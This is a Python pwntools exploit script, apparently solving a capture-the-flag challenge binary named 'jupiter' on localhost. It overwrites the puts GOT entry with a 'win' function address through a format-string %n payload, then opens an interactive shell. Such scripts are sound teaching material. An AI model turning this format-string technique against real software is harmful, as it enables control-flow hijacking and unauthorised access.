from pwn import *

# Establish the target
HOST = "localhost"
PORT = 24609
target = remote(HOST, PORT)
#gdb.attach(target, gdbscript="b *func0+51")

# Establish the target binary
target_elf = ELF("../../publish/i95/i95-jupiter/jupiter")

# Get the puts got address, and the win function address
puts_got = target_elf.got["puts"]
win_func = target_elf.sym['win'] #target_elf.functions["win"]
#win_addr = win_func.address

# First, calculate the fmt string values
first_write_val = win_func & 0xff
sec_write_val = ((win_func & 0xffff00) >> 8) - first_write_val

# Then make the payload
payload = b""
payload += f"%{first_write_val}x".encode()
payload += b"%10$n"
payload += f"%{sec_write_val}x".encode()
payload += b"%11$ln"

# Send the "0xdeadbeef" string
target.sendlineafter(b'FL? ',b"0xdeadc0de")

# Add the padding, and the payload, with the target addrsses
payload += (0x20-len(payload))*b"z"
payload += p64(puts_got)
payload += p64(puts_got+1)

# Send the payload
target.sendlineafter(b'? ', payload)
# Drop to an interactive shell
target.interactive()

